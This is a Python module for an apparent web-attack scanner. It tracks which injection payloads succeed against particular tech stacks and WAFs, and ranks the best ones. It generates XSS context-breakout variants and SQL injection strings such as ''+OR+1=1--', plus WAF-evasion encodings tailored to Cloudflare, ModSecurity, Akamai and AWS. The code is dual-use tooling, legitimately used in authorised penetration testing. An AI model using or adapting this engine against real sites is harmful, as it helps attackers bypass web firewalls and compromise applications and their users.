"""Payload effectiveness tracker and per-target payload mutation engine."""

import json
import os
import time
import threading
from collections import defaultdict
from pathlib import Path
from typing import Any


_HTML_ENTITY_MAP: dict[str, str] = {
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#x27;",
    "&": "&amp;",
}


def _url_encode(s: str) -> str:
    return "".join(f"%{ord(c):02x}" for c in s)


def _html_entity(s: str) -> str:
    return "".join(_HTML_ENTITY_MAP.get(c, c) for c in s)


def _js_string_escape(s: str) -> str:
    return s.replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"')


class PayloadIntelligenceEngine:
    """Tracks payload effectiveness and generates context-aware mutations."""

    def __init__(self, config: dict[str, Any] | None = None):
        self._config = config or {}
        self._lock = threading.Lock()
        self._records: list[dict[str, Any]] = []
        self._record_count_since_save = 0
        self._auto_save_path: str | None = self._config.get("payload_db_path")
        self._version = 1

        if self._auto_save_path:
            self.load_state(self._auto_save_path)

    # ------------------------------------------------------------------
    # PayloadEffectivenessTracker
    # ------------------------------------------------------------------

    def record_payload(self, payload: str, payload_type: str,
                       tech_stack: str | None, waf_name: str | None,
                       triggered: bool, response_time: float,
                       target_url: str) -> None:
        record: dict[str, Any] = {
            "payload": payload,
            "type": payload_type,
            "tech": tech_stack,
            "waf": waf_name,
            "triggered": triggered,
            "time_ms": response_time,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "url": target_url,
        }
        with self._lock:
            self._records.append(record)
            self._record_count_since_save += 1
            if (self._auto_save_path
                    and self._record_count_since_save >= 100):
                self._save_state(self._auto_save_path)

    record_scan_result = record_payload

    # ------------------------------------------------------------------

    def get_success_rate(self, payload: str, tech_stack: str | None = None,
                         waf: str | None = None) -> float:
        matched = self._find_records(payload, tech_stack, waf)
        if not matched:
            return 0.0
        successes = sum(1 for r in matched if r["triggered"])
        return successes / len(matched)

    # ------------------------------------------------------------------

    def get_best_payloads(self, payload_type: str, tech_stack: str,
                          waf: str | None = None,
                          top_n: int = 5) -> list[str]:
        with self._lock:
            candidates = [
                r for r in self._records
                if r["type"] == payload_type
                and r["tech"] == tech_stack
                and (waf is None or r["waf"] == waf)
            ]
        if not candidates:
            return []

        payload_map: dict[str, list[bool]] = defaultdict(list)
        for r in candidates:
            payload_map[r["payload"]].append(r["triggered"])

        scored = [
            (p, sum(t for t in triggers) / len(triggers), len(triggers))
            for p, triggers in payload_map.items()
        ]
        scored.sort(key=lambda x: (-x[1], -x[2]))
        return [p for p, _, _ in scored[:top_n]]

    # ------------------------------------------------------------------

    def get_ordered_payloads(self, payload_type: str, tech_stack: str,
                             waf: str | None = None,
                             all_payloads: list[str] | None = None
                             ) -> list[str]:
        if all_payloads is None:
            return self.get_best_payloads(payload_type, tech_stack,
                                          waf, top_n=50)
        with self._lock:
            known: dict[str, float] = {}
            for r in self._records:
                if (r["type"] == payload_type
                        and r["tech"] == tech_stack
                        and (waf is None or r["waf"] == waf)):
                    seen, total = known.get(r["payload"], (0, 0))
                    total += 1
                    if r["triggered"]:
                        seen += 1
                    known[r["payload"]] = (seen, total)

            def sort_key(p: str) -> tuple:
                if p not in known:
                    return (0, 0.0)
                seen, total = known[p]
                rate = seen / total if total else 0.0
                return (1, -rate)

            return sorted(all_payloads, key=sort_key)

    # ------------------------------------------------------------------

    def get_stats(self, payload_type: str | None = None) -> dict:
        with self._lock:
            records = self._records
            if payload_type:
                records = [r for r in records if r["type"] == payload_type]

        total = len(records)
        if not total:
            return {
                "total_records": 0,
                "unique_payloads": 0,
                "top_10": [],
            }

        payload_map: dict[str, list[bool]] = defaultdict(list)
        for r in records:
            payload_map[r["payload"]].append(r["triggered"])

        scored = [
            (p, sum(t for t in triggers) / len(triggers), len(triggers))
            for p, triggers in payload_map.items()
        ]
        scored.sort(key=lambda x: (-x[1], -x[2]))

        return {
            "total_records": total,
            "unique_payloads": len(payload_map),
            "top_10": [{"payload": p, "success_rate": round(sr, 3),
                        "attempts": n}
                       for p, sr, n in scored[:10]],
        }

    # ------------------------------------------------------------------

    def _find_records(self, payload: str, tech_stack: str | None = None,
                      waf: str | None = None) -> list[dict[str, Any]]:
        with self._lock:
            return [
                r for r in self._records
                if r["payload"] == payload
                and (tech_stack is None or r["tech"] == tech_stack)
                and (waf is None or r["waf"] == waf)
            ]

    # ------------------------------------------------------------------
    # ContextMutator
    # ------------------------------------------------------------------

    def mutate_for_context(self, base_payload: str,
                           context: str) -> list[str]:
        variants: list[str] = [base_payload]

        if context == "html_body":
            variants.append(f">{base_payload}")
            variants.append(f">{base_payload}<")
            variants.append(f"{base_payload}/>")
            variants.append(f">{base_payload}/>")

        elif context == "html_attribute":
            variants.append(f'"{base_payload}')
            variants.append(f"'{base_payload}")
            variants.append(f'"{base_payload}"onfocus="')
            variants.append(f'"{base_payload}"onfocus=')
            variants.append(f'" autofocus onfocus={base_payload} "')
            variants.append(f"' autofocus onfocus={base_payload} '")

        elif context == "script_block":
            variants.append(f"</script>{base_payload}")
            variants.append(f"</script>{base_payload}<script>")
            variants.append(f"';{base_payload};'")
            variants.append(f"\";{base_payload};\"")

        elif context == "json_value":
            escaped = _js_string_escape(base_payload)
            variants.append(f'",{escaped}')
            variants.append(f'","{escaped}')
            variants.append(f'\\",{escaped}')
            variants.append(f"{escaped}")
            variants.append(f'\\"{escaped}\\"')

        elif context == "url_param":
            encoded = _url_encode(base_payload)
            variants.append(encoded)
            variants.append(f"%26{encoded[1:]}" if encoded.startswith("%")
                            else encoded)
            variants.append(f"&{base_payload}")
            variants.append(f"?{base_payload}")

        elif context == "comment":
            variants.append(f"-->{base_payload}")
            variants.append(f"-->{base_payload}<!--")
            variants.append(f"-->{base_payload} ")

        elif context == "textarea":
            variants.append(f"</textarea>{base_payload}")
            variants.append(f"</textarea>{base_payload}<textarea>")
            variants.append(f"</TEXTAREA>{base_payload}")
            variants.append(f"</textarea>{base_payload}</textarea>")

        elif context == "css":
            variants.append(f"</style>{base_payload}")
            variants.append(f"</style>{base_payload}<style>")
            variants.append(f"expression({base_payload})")
            variants.append(f"expression('{base_payload}')")
            variants.append(f"{base_payload}/**/{{}}")

        return variants

    # ------------------------------------------------------------------

    def mutate_for_waf(self, base_payload: str,
                       waf_name: str) -> list[str]:
        variants: list[str] = [base_payload]
        waf_lower = waf_name.lower() if waf_name else ""

        if "cloudflare" in waf_lower:
            variants.append(self._comment_inject(base_payload))
            variants.append(self._unicode_normalize(base_payload))
            variants.append(_html_entity(base_payload))

        elif "modsecurity" in waf_lower:
            variants.append(self._whitespace_fragment(base_payload))
            variants.append(self._null_byte_inject(base_payload))
            variants.append(_url_encode(base_payload))

        elif "akamai" in waf_lower:
            variants.append(self._hex_encode(base_payload))
            variants.append(self._base64_encode(base_payload))
            variants.append(self._unicode_normalize(base_payload))

        elif "aws" in waf_lower or "amazon" in waf_lower:
            variants.append(self._case_permute(base_payload))
            variants.append(self._comment_inject(base_payload))
            variants.append(_html_entity(base_payload))

        return variants

    # ------------------------------------------------------------------

    def mutate_all(self, base_payload: str,
                   contexts: list[str],
                   waf: str | None = None) -> list[str]:
        seen: set[str] = set()
        results: list[str] = []

        for ctx in contexts:
            for v in self.mutate_for_context(base_payload, ctx):
                if v not in seen:
                    seen.add(v)
                    results.append(v)

        if waf:
            for v in self.mutate_for_waf(base_payload, waf):
                if v not in seen:
                    seen.add(v)
                    results.append(v)

        return results

    # ------------------------------------------------------------------

    def mutate_sqli(self, base_payload: str,
                    context: str = "json_body") -> list[str]:
        variants: list[str] = [base_payload]

        if context == "json_body":
            variants.append(f'"{base_payload}"')
            variants.append(f'\\"{base_payload}\\"')
            variants.append(f'{base_payload}"--')
            variants.append(f'{base_payload}"-- -')
            variants.append(f'{base_payload}"#')

        elif context == "header":
            variants.append(f"'+OR+1=1--+-")
            variants.append(f"'%20OR%201%3D1--%20")
            variants.append(f"`{base_payload}")
            variants.append(f"\\{base_payload}")

        elif context == "comment":
            variants.append(re.sub(r"\s+OR\s+", "/**/OR/**/",
                                   base_payload, flags=re.I))
            variants.append(re.sub(r"\s+AND\s+", "/**/AND/**/",
                                   base_payload, flags=re.I))
            variants.append(re.sub(r"\s+", "/**/", base_payload))
            variants.append(base_payload.replace(" ", "/**/"))
            variants.append(base_payload.replace("--", "--+"))
            variants.append(base_payload.replace("--", "--%20"))
            variants.append(base_payload.replace("#", "--%20"))

        return variants

    # ------------------------------------------------------------------
    # WAF mutation helpers (mirror waf_evasion.py strategies)
    # ------------------------------------------------------------------

    @staticmethod
    def _comment_inject(payload: str) -> str:
        import re
        return re.sub(r"(?<=<)(?=[a-zA-Z/])", "!---->", payload)

    @staticmethod
    def _unicode_normalize(payload: str) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def _whitespace_fragment(payload: str) -> str:
        import re
        result = re.sub(r"(?<=[a-zA-Z])(?=[A-Z])", "  ", payload)
        result = result.replace("<", "< ").replace(">", " >")
        return re.sub(r"\s{2,}", "  ", result)

    @staticmethod
    def _null_byte_inject(payload: str) -> str:
        import re
        return re.sub(r"(?<=[a-z])(?=[a-z])", "%00", payload, flags=re.I)

    @staticmethod
    def _hex_encode(payload: str) -> str:
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    @staticmethod
    def _base64_encode(payload: str) -> str:
        import base64
        try:
            return base64.b64encode(payload.encode()).decode()
        except Exception:
            return payload

    @staticmethod
    def _case_permute(payload: str) -> str:
        import re
        tokens = re.split(r"(<\/?[a-zA-Z]+)", payload)
        for i, token in enumerate(tokens):
            tag_match = re.match(r"^<\/?([a-zA-Z]+)", token)
            if tag_match:
                tag = tag_match.group(1)
                prefix = token[:token.index(tag)]
                alt = "".join(
                    c.upper() if j % 2 == 0 else c.lower()
                    for j, c in enumerate(tag)
                )
                tokens[i] = prefix + alt + token[token.index(tag) + len(tag):]
        return "".join(tokens)

    # ------------------------------------------------------------------
    # Persistence
    # ------------------------------------------------------------------

    def save_state(self, filepath: str) -> None:
        with self._lock:
            self._save_state(filepath)
            self._record_count_since_save = 0

    def _save_state(self, filepath: str) -> None:
        data = {
            "records": self._records,
            "version": self._version,
        }
        Path(filepath).parent.mkdir(parents=True, exist_ok=True)
        with open(filepath, "w") as f:
            json.dump(data, f, indent=2)

    def load_state(self, filepath: str) -> None:
        path = Path(filepath)
        if not path.is_file():
            return
        try:
            with open(path) as f:
                data = json.load(f)
            with self._lock:
                records = data.get("records", [])
                self._records = records
                self._version = data.get("version", 1)
                self._record_count_since_save = 0
        except (json.JSONDecodeError, OSError):
            pass


# Keep import-level re available for mutate_sqli
import re
